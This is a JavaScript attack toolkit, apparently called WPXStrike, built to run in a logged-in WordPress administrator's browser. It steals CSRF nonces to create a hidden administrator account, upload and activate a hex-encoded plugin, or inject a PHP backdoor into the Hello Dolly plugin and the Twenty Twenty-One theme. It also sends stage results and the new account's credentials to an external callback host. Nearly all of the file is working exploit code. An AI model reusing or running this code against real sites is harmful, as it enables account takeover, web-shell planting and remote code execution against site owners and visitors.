/*
              ;,_            ,
                 _uP~"b          d"u,
                dP'   "b       ,d"  "o
               d"    , `b     d"'    "b
              l] [    " `l,  d"       lb
              Ol ?     "  "b`"=uoqo,_  "l
            ,dBb "b        "b,    `"~~TObup,_
          ,d" (db.`"         ""     "tbc,_ `~"Yuu,_
        .d" l`T'  '=                      ~     `""Yu,
      ,dO` gP,                           `u,   b,_  "b7         
     d?' ,d" l,                           `"b,_ `~b  "1
   ,8i' dl   `l                 ,ggQOV",dbgq,._"  `l  lb      WPXStrike (https://github.com/nowak0x01/WPXStrike)
  .df' (O,    "             ,ggQY"~  , @@@@@d"bd~  `b "1
 .df'   `"           -=@QgpOY""     (b  @@@@P db    `Lp"b,
.d(                  _               "ko "=d_,Q`  ,_  "  "b,
Ql         .         `"qo,._          "tQo,_`""bo ;tb,    `"b,
qQ         |L           ~"QQQgggc,_.,dObc,opooO  `"~~";.   __,7,
qp         t\io,_           `~"TOOggQV""""        _,dg,_ =PIQHib.
`qp        `Q["tQQQo,_                          ,pl{QOP"'   7AFR`
  `         `tb  '""tQQQg,_             p" "b   `       .;-.`Vl'
             "Yb      `"tQOOo,__    _,edb    ` .__   /`/'|  |b;=;.__
                           `"tQQQOOOOP""`"\QV;qQObob"`-._`\_~~-._
                                """"    ._        /   | |oP"\_   ~\ ~\_~\
                                        `~"\ic,qggddOOP"|  |  ~\   `\~-._
                                          ,qP`"""|"   | `\ `;   `\   `\
                               _        _,p"     |    |   `\`;    |    |
    @Author: Hudson Nowak      "boo,._dP"       `\_  `\    `\|   `\   ;
                                 `"7tY~'            `\  `\    `|_   |
                                                      `~\  |
*/


// ************************************ ~% Variables %~ ************************************ //

var Target = "https://10.0.1.73:10050/wp/"; // Ex: https://172.16.0.13:8000/wordpress/
var Callback = "https://xopy8j7taqgx8638bcvddnufh3nxbozd.oastify.com/"; // Ex: https://collaborator.oastify.com/ (optional) (only if you want to receive feedback at each stage).

// ************************************ ~% Functions %~ ************************************ //

// WPCreateAccount(); // (Privilege Escalation) - Creates an user in WordPress.
// WPUploadCustomPlugin(); // (RCE) - Upload your custom plugin to WordPress.
// WPEditPlugins(); // (RCE) - Edit a Built-In Plugins in WordPress.
// WPEditThemes(); // (RCE) - Edit a Built-In Themes in WordPress.
// CustomExploits(); // (Custom) - Custom Exploits for Third-Party WordPress Plugins/Themes.

function WPCreateAccount() {

    /* ************************************************************************************************************************************************ */
    var Username = "nowak";         // Ex: operator (It is recommended to use a valid employee name from the target company).
    var Password = `j^QEkyvd7*g3xqsE`;          // (weak password are allowed).
    var Email = "nowak@example.com";  // Ex: user@company.net (It is recommended to use a business email from the target company) (No email will be sent to the email address entered).
    var Role = "administrator";                 // Ex: administrator, editor, author, contributor, subscriber.
    var FirstName = ""; // (optional)
    var LastName = "";  // (optional)
    /* ************************************************************************************************************************************************ */

    if (Target.substr(-1) != '/') Target += '/';
    var _stage1 = new XMLHttpRequest();
    _stage1.open("GET", Target + "wp-admin/user-new.php", false);
    _stage1.send();

    if (_stage1.responseText) {

        var csrf_token = _stage1.responseText.match(/id="_wpnonce_create-user"[\s\S]*?value="(.*?)"/)[1];

        if (csrf_token) {

            var _stage2 = new XMLHttpRequest();
            _stage2.open("POST", Target + "wp-admin/user-new.php", false);
            _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            _stage2.send("action=createuser&_wpnonce_create-user=" +
                csrf_token + "&_wp_http_referer=%2Fwp-admin%2Fuser-new.php&user_login=" +
                encodeURIComponent(Username) + "&email=" +
                encodeURIComponent(Email) + "&first_name=" +
                encodeURIComponent(FirstName) + "&last_name=" +
                encodeURIComponent(LastName) + "&url=&pass1=" +
                encodeURIComponent(Password) + "&pass2=" +
                encodeURIComponent(Password) + "&pw_weak=on&role=" +
                Role + "&createuser=Add%2BNew%2BUser");

            if (_stage2.responseText.match("already registered")) {

                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/user-new.php",
                            "Error": "Stage 2 - (Cannot Create User)",
                            "Message": _stage2.responseText.match(/<div class="error">\s*<p><strong>Error:<\/strong>\s*(.*?)<\/p>/)[1],
                            "Data": {
                                "User": Username,
                                "Email": Email,
                                "Password": Password,
                                "Role": Role,
                                "FirstName": FirstName,
                                "LastName": LastName
                            }
                        }
                    )
                );
            } else if (_stage2.responseText.match(Username)[0]) {

                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/user-new.php",
                            "Message": "User Created Successful!",
                            "Data": {
                                "User": Username,
                                "Email": Email,
                                "Password": Password,
                                "Role": Role,
                                "FirstName": FirstName,
                                "LastName": LastName
                            }
                        }
                    )
                );
            } else {

                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/user-new.php",
                            "Error": "Stage 2 - (Cannot Create User)",
                            "Message": _stage2.responseText.match(/<div class="error">\s*<p><strong>Error:<\/strong>\s*(.*?)<\/p>/)[1],
                            "Data": {
                                "User": Username,
                                "Email": Email,
                                "Password": Password,
                                "Role": Role,
                                "FirstName": FirstName,
                                "LastName": LastName
                            }
                        }
                    )
                );
            }

        } else {

            if (Callback) {

                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/user-new.php",
                            "Error": "Stage 1 - (Cannot GET CSRF_TOKEN)",
                            "Data": {
                                "User": Username,
                                "Email": Email,
                                "Password": Password,
                                "Role": Role,
                                "FirstName": FirstName,
                                "LastName": LastName
                            }
                        }
                    )
                );
            }
        }

    } else {
        if (Callback) {

            var _callback = new XMLHttpRequest();
            _callback.open("POST", Callback, true);
            _callback.send(
                JSON.stringify(
                    {
                        "Host": Target + "wp-admin/user-new.php",
                        "Module": "WPCreateAccount()",
                        "Error": "Stage 1 - (Cannot Get Server Response!)",
                    }
                )
            );
        }
    }
}

function WPUploadCustomPlugin() {

    /* ************************************************************************************************************************************************ */
    // The name and the filename of your plugin. (only change it if you are going to use another plugin other than WPAnalytics).
    var Plugin = "WPAnalytics/WPAnalytics.php";

    // The Contents of your .zip plugin file encoded in Hex. (only change it if you are going to use another plugin other than WPAnalytics) -> Ex: xxd -p -c 0 [File.zip].
    var HexFileContent = "504b0304140000000800aa1b2f57899a2b6b86020000fe0400000f001c005750416e616c79746963732e706870555409000390cf036590cf036575780b000104e803000004e8030000cd535d4fdb40107c4e7ec516214810b6f9286d815a2d8236a04a9052681eaa0aaded4d7c8d7d77ba3bc70988ffdebd38a429a2efb5fc70be9dd99ddd59bfffa073dd8eb6dab00583fe89c462e6446afde747ac5cae0cac3ce7556695844b55e398217354ad4ca60d591be8a21a09e92ffbf3135c6249470beab3e467645323b4134abe8000610141ab9accb02a0097f74d0918b2ac01d7edfbbae07274a08d9a888c2ccc5405b5703964441a84b462943bce289df2310335255638dae46c9c5e9912654a5c2383ca928184729c08654218f82c847616381518c20c32b479a2d064768e4f55c99de7c435260486b432ce6ecf15a428a1c43131c5619019064856940acb1db364058a9b2fc53d3d17952ae948ba6d10a5ef891a55244738a2721ef0a513a5ac6ba84a164212780f883b09fd784f1aeb6eaf2f9ea60bb973da1e45d188bbaa9290b547d2fbb833ddd98d3ce73b19bb62877f0ec23d8e44ed766b3dc5a248301d430c095a7af3fa8ebb511975d6effa57df6e7e6c7ed97d77589eedfddafcd93d862882d31ce588e02617d6d319fa4fea550f0ff7b331be446db7c4b023ac25d7596ae8c2c606fc51f42a86b5b52e3c30d68357a4c61ce1fd1672a818b038759a22d7e42a23572f3bce1b86502835065ea94c584c0aba1b56327573db22f661228c92de0898a0111e60bbbe72b4059fa658ea82fc57cb770651ad83859f51b3ba367a680e8fd1c35014f418faff8ff1e7ece7115093c1bbe32f4f1b6e7033d3fc23a1d68548d14b89a6415dd781dfdea03205fbcef3cc3c250cc379fd273be2b497d7383828933a8e7d84ed6c3dfe3d56e62e46ea5d5a8eb3d5e27739cd05eef8ffeef5f37dba7fad52791b6f3c6d558c83af6f2f7ad3fb8bd3dd3ce98d56a6f01b504b01021e03140000000800aa1b2f57899a2b6b86020000fe0400000f0018000000000001000000a481000000005750416e616c79746963732e706870555405000390cf036575780b000104e803000004e8030000504b0506000000000100010055000000cf0200000000";
    /* ************************************************************************************************************************************************ */

    if (Target.substr(-1) != '/') Target += '/';
    var _stage1 = new XMLHttpRequest();
    _stage1.open("GET", Target + "wp-admin/plugin-install.php", false);
    _stage1.send();

    if (_stage1.responseText) {

        var csrf_token = _stage1.responseText.match(/<input\s+type="hidden"\s+id="_wpnonce"\s+name="_wpnonce"\s+value="([^"]+)"\s*\/>/)[1];

        if (csrf_token) {

            var blob = hexToBlob(HexFileContent);
            var boundary = "--nowak0x01";
            var formData = new FormData();
            formData.append("_wpnonce", `${csrf_token}`);
            formData.append("_wp_http_referer", "/wp-admin/plugin-install.php");
            formData.append("pluginzip", new Blob([blob], { type: "application/octet-stream" }), Plugin.match(/([^/]+)/)[0] + ".zip");

            function hexToBlob(hexString) {
                const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer;
                return new Blob([arrayBuffer], { type: 'application/octet-stream' });
            }

            var _stage2 = new XMLHttpRequest();

            _stage2.open("POST", Target + "wp-admin/update.php?action=upload-plugin", false);
            _stage2.send(formData);

            var csrf_token2 = _stage2.responseText.match(/plugins\.php\?action=activate[^"]*&amp;_wpnonce=([^"&]+)/);
            Plugin = _stage2.responseText.match(/href="[^"]*plugins\.php\?action=activate[^"]*&amp;plugin=([^&]+)&amp;_/);

            if (csrf_token2 !== null) { csrf_token2 = csrf_token2[1]; }
            if (Plugin !== null) { Plugin = Plugin[1]; }

            if (_stage2.responseText.match("Destination folder already exists") || _stage2.responseText.match("This plugin is already installed")) {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                "Error": "Stage 2 - (Cannot Upload Plugin)",
                                "Message": "Destination folder already exists OR This plugin is already installed."
                            }
                        )
                    );
                }
            } else if (Plugin && csrf_token2) {

                var _callbackx = new XMLHttpRequest();
                _callbackx.open("POST", Callback, true);
                _callbackx.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/update.php?action=upload-plugin",
                            "Success": "Stage 2 - Plugin Uploaded!",
                            "Data": {
                                "Path": Target + "wp-content/plugins/" + decodeURIComponent(Plugin)
                            }
                        }
                    )
                );

                var _stage3 = new XMLHttpRequest();
                _stage3.open("GET", Target + "wp-admin/plugins.php?action=activate&plugin=" + decodeURIComponent(Plugin) + "&_wpnonce=" + csrf_token2, false);
                _stage3.send();

                if (_stage3.responseText.match("Plugin activated")) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/plugins.php?action=activate&plugin=",
                                "Success": "Stage 3 - Plugin Activated!",
                                "Data": {
                                    "Path": Target + "wp-content/plugins/" + decodeURIComponent(Plugin)
                                }
                            }
                        )
                    );
                }

            } else {

                if (Callback) {
                    var _xcallback = new XMLHttpRequest();
                    _xcallback.open("POST", Callback, true);
                    _xcallback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/update.php?action=upload-plugin",
                                "Error": "Stage 2 - (Cannot Upload Plugin!)",
                                "Data": {
                                    "Plugin": Plugin
                                }
                            }
                        )
                    );
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/plugin-install.php",
                            "Error": "Stage 1 - (Cannot GET CSRF_TOKEN)",
                            "Data": {
                                "Plugin": Plugin
                            }
                        }
                    )
                );
            }
        }
    } else {

        if (Callback) {
            var _callback = new XMLHttpRequest();
            _callback.open("POST", Callback, true);
            _callback.send(
                JSON.stringify(
                    {
                        "Host": Target + "wp-admin/plugin-install.php",
                        "Module": "WPUploadCustomPlugin()",
                        "Error": "Stage 1 - (Cannot Get Server Response!)",
                    }
                )
            );
        }
    }
}

function WPEditPlugins() {

    /* ************************************************************************************************************************************************ */
    // do not use "<?php" or "?>", your payload is already inside a php tag.
    var payload = `
    $callback = base64_decode($_POST['K189mD2j']); // Change This
	$code = base64_decode($_POST['OGa93dka']); // Change This
	if(isset($callback) && $callback != "") {
		if($callback === "phpinfo") phpinfo();
	}
	if(isset($code) && $code != "") $callback($code);
    `;
    /* ************************************************************************************************************************************************ */

    // Plugin: Hello Dolly
    function HelloDolly() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select", false);
        _stage1.send();

        if (_stage1.responseText) {

            var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

            if (csrf_token) {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", "wp-admin/admin-ajax.php", false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send("nonce=" + csrf_token +
                    "&_wp_http_referer=" + encodeURIComponent("/wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select") +
                    "&newcontent=%3C%3Fphp%0A%2F**%0A+*+%40package+Hello_Dolly%0A+*+%40version+1.7.2%0A+*%2F%0A%2F*%0APlugin+Name%3A+Hello+Dolly%0APlugin+URI%3A+http%3A%2F%2Fwordpress.org%2Fplugins%2Fhello-dolly%2F%0ADescription%3A+This+is+not+just+a+plugin%2C+it+symbolizes+the+hope+and+enthusiasm+of+an+entire+generation+summed+up+in+two+words+sung+most+famously+by+Louis+Armstrong%3A+Hello%2C+Dolly.+When+activated+you+will+randomly+see+a+lyric+from+%3Ccite%3EHello%2C+Dolly%3C%2Fcite%3E+in+the+upper+right+of+your+admin+screen+on+every+page.%0AAuthor%3A+Matt+Mullenweg%0AVersion%3A+1.7.2%0AAuthor+URI%3A+http%3A%2F%2Fma.tt%2F%0A*%2F%0A%0Afunction+hello_dolly_get_lyric()+%7B%0A%09%2F**+These+are+the+lyrics+to+Hello+Dolly+*%2F%0A%09%24lyrics+%3D+%22Hello%2C+Dolly%0AWell%2C+hello%2C+Dolly%0AIt's+so+nice+to+have+you+back+where+you+belong%0AYou're+lookin'+swell%2C+Dolly%0AI+can+tell%2C+Dolly%0AYou're+still+glowin'%2C+you're+still+crowin'%0AYou're+still+goin'+strong%0AI+feel+the+room+swayin'%0AWhile+the+band's+playin'%0AOne+of+our+old+favorite+songs+from+way+back+when%0ASo%2C+take+her+wrap%2C+fellas%0ADolly%2C+never+go+away+again%0AHello%2C+Dolly%0AWell%2C+hello%2C+Dolly%0AIt's+so+nice+to+have+you+back+where+you+belong%0AYou're+lookin'+swell%2C+Dolly%0AI+can+tell%2C+Dolly%0AYou're+still+glowin'%2C+you're+still+crowin'%0AYou're+still+goin'+strong%0AI+feel+the+room+swayin'%0AWhile+the+band's+playin'%0AOne+of+our+old+favorite+songs+from+way+back+when%0ASo%2C+golly%2C+gee%2C+fellas%0AHave+a+little+faith+in+me%2C+fellas%0ADolly%2C+never+go+away%0APromise%2C+you'll+never+go+away%0ADolly'll+never+go+away+again%22%3B%0A%0A%09%2F%2F+Here+we+split+it+into+lines.%0A%09%24lyrics+%3D+explode(+%22%5Cn%22%2C+%24lyrics+)%3B%0A%0A%09%2F%2F+And+then+randomly+choose+a+line.%0A%09return+wptexturize(+%24lyrics%5B+mt_rand(+0%2C+count(+%24lyrics+)+-+1+)+%5D+)%3B%0A%7D%0A%0A%09" +
                    encodeURIComponent(payload) +
                    "%0A%0A%2F%2F+This+just+echoes+the+chosen+line%2C+we'll+position+it+later.%0Afunction+hello_dolly()+%7B%0A%09%24chosen+%3D+hello_dolly_get_lyric()%3B%0A%09%24lang+++%3D+''%3B%0A%09if+(+'en_'+!%3D%3D+substr(+get_user_locale()%2C+0%2C+3+)+)+%7B%0A%09%09%24lang+%3D+'+lang%3D%22en%22'%3B%0A%09%7D%0A%0A%09printf(%0A%09%09'%3Cp+id%3D%22dolly%22%3E%3Cspan+class%3D%22screen-reader-text%22%3E%25s+%3C%2Fspan%3E%3Cspan+dir%3D%22ltr%22%25s%3E%25s%3C%2Fspan%3E%3C%2Fp%3E'%2C%0A%09%09__(+'Quote+from+Hello+Dolly+song%2C+by+Jerry+Herman%3A'+)%2C%0A%09%09%24lang%2C%0A%09%09%24chosen%0A%09)%3B%0A%7D%0A%0A%2F%2F+Now+we+set+that+function+up+to+execute+when+the+admin_notices+action+is+called.%0Aadd_action(+'admin_notices'%2C+'hello_dolly'+)%3B%0A%0A%2F%2F+We+need+some+CSS+to+position+the+paragraph.%0Afunction+dolly_css()+%7B%0A%09echo+%22%0A%09%3Cstyle+type%3D'text%2Fcss'%3E%0A%09%23dolly+%7B%0A%09%09float%3A+right%3B%0A%09%09padding%3A+5px+10px%3B%0A%09%09margin%3A+0%3B%0A%09%09font-size%3A+12px%3B%0A%09%09line-height%3A+1.6666%3B%0A%09%7D%0A%09.rtl+%23dolly+%7B%0A%09%09float%3A+left%3B%0A%09%7D%0A%09.block-editor-page+%23dolly+%7B%0A%09%09display%3A+none%3B%0A%09%7D%0A%09%40media+screen+and+(max-width%3A+782px)+%7B%0A%09%09%23dolly%2C%0A%09%09.rtl+%23dolly+%7B%0A%09%09%09float%3A+none%3B%0A%09%09%09padding-left%3A+0%3B%0A%09%09%09padding-right%3A+0%3B%0A%09%09%7D%0A%09%7D%0A%09%3C%2Fstyle%3E%0A%09%22%3B%0A%7D%0A%0Aadd_action(+'admin_head'%2C+'dolly_css'+)%3B%0A" +
                    "&action=edit-theme-plugin-file&file=hello.php&plugin=hello.php&docs-list="
                );

                if (_stage2.responseText.match("File edited successfully")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Success": "Stage 2 - Plugin (Hello Dolly) Edited!",
                                    "Path": Target + "wp-content/plugins/hello.php",
                                    "Message": _stage2.responseText
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Error": "Stage 2 - Cannot Edit (Hello Dolly) Plugin!",
                                    "Message": _stage2.responseText
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/admin-ajax.php",
                                "Error": "Stage 1 - (Cannot GET CSRF_TOKEN)",
                            }
                        )
                    );
                }
            }
        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/plugin-editor.php?plugin=hello.php&Submit=Select",
                            "Module": "WPEditPlugins()",
                            "Error": "Stage 1 - (Cannot Get Server Response!)",
                        }
                    )
                );
            }
        }
    }

    HelloDolly();

}

function WPEditThemes() {

    /* ************************************************************************************************************************************************ */
    // do not use "<?php" or "?>", your payload is already inside a php tag
    var payload = `
    $callback = base64_decode($_POST['K189mD2j']); // Change This
	$code = base64_decode($_POST['OGa93dka']); // Change This
	if(isset($callback) && $callback != "") {
		if($callback === "phpinfo") phpinfo();
	}
	if(isset($code) && $code != "") $callback($code);
    `;
    /* ************************************************************************************************************************************************ */

    // Theme: Twenty Twenty-One //
    function TwentyTwentyOne() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "wp-admin/theme-editor.php?file=inc%2Fcustom-css.php&theme=twentytwentyone", false);
        _stage1.send();

        if (_stage1.responseText) {

            var csrf_token = _stage1.responseText.match(/<input[^>]*name="nonce"[^>]*value="([^"]+)"/)[1];

            if (csrf_token) {

                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + "wp-admin/admin-ajax.php", false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
                    "nonce=" + csrf_token +
                    "&_wp_http_referer=%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dinc%252Fcustom-css.php%26theme%3Dtwentytwentyone&newcontent=%3C%3Fphp%0A%2F**%0A+*+Custom+CSS%0A+*%0A+*+%40package+WordPress%0A+*+%40subpackage+Twenty_Twenty_One%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%2F%0A%0A%2F**%0A+*+Generate+CSS.%0A+*%0A+*+%40since+Twenty+Twenty-One+1.0%0A+*%0A+*+%40param+string+%24selector+The+CSS+selector.%0A+*+%40param+string+%24style++++The+CSS+style.%0A+*+%40param+string+%24value++++The+CSS+value.%0A+*+%40param+string+%24prefix+++The+CSS+prefix.%0A+*+%40param+string+%24suffix+++The+CSS+suffix.%0A+*+%40param+bool+++%24display++Print+the+styles.%0A+*+%40return+string%0A+*%2F%0Afunction+twenty_twenty_one_generate_css(+%24selector%2C+%24style%2C+%24value%2C+%24prefix+%3D+''%2C+%24suffix+%3D+''%2C+%24display+%3D+true+)+%7B%0A%0A%09%2F%2F+Bail+early+if+there+is+no+%24selector+elements+or+properties+and+%24value.%0A%09if+(+!+%24value+%7C%7C+!+%24selector+)+%7B%0A%09%09return+''%3B%0A%09%7D%0A%0A%09%24css+%3D+sprintf(+'%25s+%7B+%25s%3A+%25s%3B+%7D'%2C+%24selector%2C+%24style%2C+%24prefix+.+%24value+.+%24suffix+)%3B%0A%0A%09if+(+%24display+)+%7B%0A%09%09%2F*%0A%09%09+*+Note+to+reviewers%3A+%24css+contains+auto-generated+CSS.%0A%09%09+*+It+is+included+inside+%3Cstyle%3E+tags+and+can+only+be+interpreted+as+CSS+on+the+browser.%0A%09%09+*+Using+wp_strip_all_tags()+here+is+sufficient+escaping+to+avoid%0A%09%09+*+malicious+attempts+to+close+%3C%2Fstyle%3E+and+open+a+%3Cscript%3E.%0A%09%09+*%2F%0A%09%09echo+wp_strip_all_tags(+%24css+)%3B+%2F%2F+phpcs%3Aignore+WordPress.Security.EscapeOutput%0A%09%7D%0A%09return+%24css%3B%0A%7D%0A" +
                    encodeURIComponent(payload) +
                    "&action=edit-theme-plugin-file&file=inc%2Fcustom-css.php&theme=twentytwentyone&docs-list="
                );

                if (_stage2.responseText.match("File edited successfully")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Success": "Stage 2 - Theme (Twenty Twenty-One) Edited!",
                                    "Path": Target + "wp-content/themes/twentytwentyone/inc/custom-css.php",
                                    "Message": _stage2.responseText
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + "wp-admin/admin-ajax.php",
                                    "Error": "Stage 2 - Cannot Edit (Twenty Twenty-One) Theme!",
                                    "Message": _stage2.responseText
                                }
                            )
                        );
                    }
                }

            } else {

                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "wp-admin/admin-ajax.php",
                                "Error": "Stage 1 - (Cannot GET CSRF_TOKEN)",
                            }
                        )
                    );
                }
            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "wp-admin/theme-editor.php?file=inc%2Fcustom-css.php&theme=twentytwentyone",
                            "Module": "WPEditThemes()",
                            "Error": "Stage 1 - (Cannot Get Server Response!)",
                        }
                    )
                );
            }
        }
    }

    TwentyTwentyOne();

}

function CustomExploits() {

    /* ########################################################################################################### */
    // #   This CustomExploit function will contain exploits for vulnerabilities in third-party plugins/themes   # //
    /* ########################################################################################################### */

}
